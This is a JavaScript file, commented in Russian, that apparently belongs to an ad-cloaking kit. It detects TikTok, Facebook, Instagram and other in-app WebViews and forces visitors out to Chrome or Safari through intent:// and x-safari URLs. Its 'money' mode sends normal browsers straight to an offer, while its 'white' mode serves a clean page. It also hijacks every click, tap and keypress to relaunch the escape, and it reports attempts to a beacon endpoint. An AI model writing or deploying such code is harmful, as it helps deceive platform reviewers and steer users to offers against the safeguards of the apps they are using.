(function () {
  'use strict';

  var cfg   = window.IntentBypassConfig || {};
  var PAGE  = (cfg.page || '').toLowerCase(); // 'money' или всё остальное = white
  var DEBUG = !!cfg.debug;

  function log() {
    if (DEBUG && window.console && console.log) {
      console.log.apply(console, ['[intent-hybrid]'].concat([].slice.call(arguments)));
    }
  }

  function UA() {
    return (navigator.userAgent || navigator.vendor || '').toLowerCase();
  }

  function isAndroid()   { return /android/.test(UA()); }
  function isIOS()       { return /(iphone|ipad|ipod|ios)/.test(UA()); }
  function isChromeLike(){ return /(chrome|crios)/.test(UA()); }

  // Heuristics для in-app WebView (TikTok, FB, IG, WebView "wv")
  function isInAppWebView() {
    var u = UA();
    var hasWV   = u.includes(' wv') || u.includes('; wv)');
    var isTT    = /tiktok|musical_ly|ttwebview|bytedance|aweme/.test(u);
    var isFBIG  = /fban|fbav|fb_iab|instagram|igapp|messenger/.test(u);
    var isOther = /line\/|wechat|snapchat|pinterest/.test(u);
    return hasWV || isTT || isFBIG || isOther;
  }

  function normUrl(u) {
    if (!u) return '';
    var s = String(u).trim();
    if (!s) return '';
    try {
      return new URL(s, location.href).href;
    } catch (_) {
      return s;
    }
  }

  var INTENT_TARGET = normUrl(cfg.intentTarget) || '';
  var CLEAN_TARGET  = normUrl(cfg.cleanTarget)  || INTENT_TARGET || '';
  var AUTO          = !!cfg.autoAttemptOnLoad;

  function buildChromeIntent(targetUrl, fallbackUrl) {
    var t = normUrl(targetUrl);
    if (!t) return '';
    var f = normUrl(fallbackUrl || targetUrl) || t;
    return 'intent://navigate?url=' + encodeURIComponent(t) +
           '#Intent;scheme=googlechrome;package=com.android.chrome;' +
           'S.browser_fallback_url=' + encodeURIComponent(f) + ';end;';
  }

  function buildXSafari(targetUrl) {
    var t = normUrl(targetUrl);
    if (!t) return '';
    return 'x-safari-https://' + t.replace(/^https?:\/\//i, '');
  }

  function sendBeacon(status, extra) {
    if (!cfg.beaconEndpoint) return;
    try {
      var payload = {
        ts: Date.now(),
        status: status,
        extra: extra || {},
        ua: navigator.userAgent || ''
      };
      if (navigator.sendBeacon) {
        navigator.sendBeacon(cfg.beaconEndpoint, JSON.stringify(payload));
      } else {
        fetch(cfg.beaconEndpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(function(){});
      }
    } catch (e) {
      log('beacon error:', e);
    }
  }

  // --- базовая операция: дернуть интент / x-safari / прямой URL ---
  function openExternalViaIntent(targetUrl, reason) {
    var t = normUrl(targetUrl);
    if (!t) {
      log('openExternalViaIntent: empty target, skip');
      return;
    }

    var finalUrl;
    if (isAndroid() && isChromeLike()) {
      finalUrl = buildChromeIntent(t, t);
    } else if (isIOS()) {
      finalUrl = buildXSafari(t);
    } else {
      finalUrl = t;
    }

    log('openExternalViaIntent:', reason, '->', finalUrl);
    sendBeacon('attempt', { reason: reason, finalUrl: finalUrl });

    try {
      var w = window.open(finalUrl, '_blank');
      log('window.open ->', w);
      if (!w && finalUrl !== t) {
        // popup заблокирован, пробуем хотя бы прямой URL
        location.href = t;
      }
    } catch (e) {
      log('openExternalViaIntent error:', e);
      sendBeacon('error', { message: String(e) });
      try {
        location.href = t;
      } catch (_) {
        location.assign(t);
      }
    }
  }

  function redirectNormally(targetUrl, reason) {
    var t = normUrl(targetUrl);
    if (!t) {
      log('redirectNormally: empty target, skip');
      return;
    }
    log('redirectNormally:', reason, '->', t);
    try {
      location.href = t;
    } catch (e) {
      location.assign(t);
    }
  }

  // --- WHITE: базовая логика (как старый main.js) ---
  function initWhiteBasic(inApp) {
    if (!inApp) {
      log('WHITE basic: normal browser, idle.');
      return;
    }
    var selfTarget = INTENT_TARGET || CLEAN_TARGET || location.href;
    log('WHITE basic: in WebView, single auto intent to self:', selfTarget);
    openExternalViaIntent(selfTarget, 'white-basic');
  }

  // --- WHITE: расширенная логика, если AUTO === true ---
  function initWhiteAuto(inApp) {
    if (!inApp) {
      log('WHITE auto: normal browser, idle.');
      return;
    }
    var selfTarget = INTENT_TARGET || CLEAN_TARGET || location.href;
    log('WHITE auto: in WebView, auto intent + event listeners to self:', selfTarget);

    // Авто-попытка сразу
    openExternalViaIntent(selfTarget, 'white-auto-initial');

    // Слушаем любые действия и повторяем попытку, если надо
    function handler(ev) {
      try {
        ev.preventDefault && ev.preventDefault();
        ev.stopPropagation && ev.stopPropagation();
      } catch (_) {}
      log('WHITE auto event:', ev.type, '-> intent(self)');
      openExternalViaIntent(selfTarget, 'white-auto-event-' + ev.type);
    }

    var optsPassiveFalse = { passive: false, capture: true };
    var optsPassiveTrue  = { passive: true,  capture: true };

    document.addEventListener('click',       handler, optsPassiveTrue);
    document.addEventListener('pointerdown', handler, optsPassiveTrue);
    document.addEventListener('touchstart',  handler, optsPassiveFalse);
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' || e.key === ' ') handler(e);
    }, true);
  }

  // --- MONEY: базовая логика (как старый main.js) ---
  function initMoneyBasic(inApp) {
    var offer = INTENT_TARGET || CLEAN_TARGET;

    if (!inApp) {
      if (!offer) {
        log('MONEY basic: normal browser, but no offer, idle.');
        return;
      }
      log('MONEY basic: normal browser, instant redirect to offer.');
      redirectNormally(offer, 'money-basic');
      return;
    }

    // В WebView: любое действие вызывает интент на текущий URL
    log('MONEY basic: in WebView, events -> intent(current URL).');

    function handler(ev) {
      try {
        ev.preventDefault && ev.preventDefault();
        ev.stopPropagation && ev.stopPropagation();
      } catch (_) {}
      var currentUrl = location.href;
      log('MONEY basic event:', ev.type, '-> intent(currentUrl=', currentUrl, ')');
      openExternalViaIntent(currentUrl, 'money-basic-event-' + ev.type);
    }

    var optsPassiveFalse = { passive: false, capture: true };
    var optsPassiveTrue  = { passive: true,  capture: true };

    document.addEventListener('click',       handler, optsPassiveTrue);
    document.addEventListener('pointerdown', handler, optsPassiveTrue);
    document.addEventListener('touchstart',  handler, optsPassiveFalse);
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' || e.key === ' ') handler(e);
    }, true);
  }

  // --- MONEY: расширенная логика, если AUTO === true ---
  function initMoneyAuto(inApp) {
    var offer = INTENT_TARGET || CLEAN_TARGET;

    if (!inApp) {
      if (!offer) {
        log('MONEY auto: normal browser, but no offer, idle.');
        return;
      }
      log('MONEY auto: normal browser, instant redirect to offer.');
      redirectNormally(offer, 'money-auto');
      return;
    }

    // В WebView: сразу пытаемся интентом вытащить текущую страницу + слушаем действия
    log('MONEY auto: in WebView, auto intent(current URL) + events.');

    var currentUrl = location.href;
    openExternalViaIntent(currentUrl, 'money-auto-initial');

    function handler(ev) {
      try {
        ev.preventDefault && ev.preventDefault();
        ev.stopPropagation && ev.stopPropagation();
      } catch (_) {}
      var nowUrl = location.href;
      log('MONEY auto event:', ev.type, '-> intent(currentUrl=', nowUrl, ')');
      openExternalViaIntent(nowUrl, 'money-auto-event-' + ev.type);
    }

    var optsPassiveFalse = { passive: false, capture: true };
    var optsPassiveTrue  = { passive: true,  capture: true };

    document.addEventListener('click',       handler, optsPassiveTrue);
    document.addEventListener('pointerdown', handler, optsPassiveTrue);
    document.addEventListener('touchstart',  handler, optsPassiveFalse);
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' || e.key === ' ') handler(e);
    }, true);
  }

  // --- boot ---

  function boot() {
    var inApp    = isInAppWebView();
    var pageType = (PAGE === 'money') ? 'money' : 'white';

    log('boot hybrid:', { pageType: pageType, inApp: inApp, auto: AUTO, ua: UA() });

    if (pageType === 'money') {
      if (AUTO) initMoneyAuto(inApp);
      else      initMoneyBasic(inApp);
    } else {
      if (AUTO) initWhiteAuto(inApp);
      else      initWhiteBasic(inApp);
    }
  }

  if (document.readyState === 'complete' || document.readyState === 'interactive') {
    boot();
  } else {
    document.addEventListener('DOMContentLoaded', boot);
  }

  // Для дебага
  window.__intentHybrid = {
    cfg: cfg,
    isInAppWebView: isInAppWebView,
    UA: UA
  };
})();
